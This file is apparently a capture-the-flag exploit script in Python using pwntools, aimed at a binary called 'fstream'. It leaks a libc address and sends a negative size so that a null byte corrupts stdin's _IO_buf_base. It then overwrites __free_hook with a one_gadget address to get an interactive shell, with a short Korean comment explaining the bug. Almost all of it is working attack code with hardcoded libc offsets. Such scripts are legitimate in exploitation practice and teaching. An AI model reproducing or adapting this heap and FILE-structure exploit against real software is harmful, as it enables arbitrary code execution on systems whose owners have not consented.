#-*-encoding: utf8 -*-
from pwn import *

r = process('./fstream')

r.recvuntil('> ')
r.send('11010110')

r.send('a'*0x98)
r.recvuntil('a'*0x98)
libc_start_main = r.recvuntil('> ')
libc_start_main = u64(libc_start_main[:6] + '\x00\x00') - 240
'''
*(buf+size-1) = 0 -> size에 음수를 주면 buf = malloc(size)에서 NULL이 반환
==> *(buf+size-1) = 0 -> *(size-1) = 0
size를 조작하여 _IO_buf_base를 조작할 수 있다.
'''
libc_base = libc_start_main - 0x20740
oneshot = libc_base + 0x4526a
free_hook = libc_base + 0x3c67a8
_IO_stdin = libc_base + 0x3c4918
io_buf_base = -(0x10000000000000000 - _IO_stdin - 1)

log.info('libc_base: ' + hex(libc_base))
log.info('oneshot: ' + hex(oneshot))
log.info('free_hook: ' + hex(free_hook))
log.info('_IO_stdin: ' + hex(_IO_stdin))
log.info('io_buf_base: ' + hex(io_buf_base))

r.send('11111111')
r.send('10110101')

# io_buf_base = io_write_base
r.recv()
r.sendline(str(io_buf_base))

payload = p64(free_hook) * 4 + p64(free_hook+0x10) + p64(0)
r.recv()
r.send(payload)

raw_input()

r.recv()
r.sendline('\x00'*168 + p64(oneshot))

r.interactive()
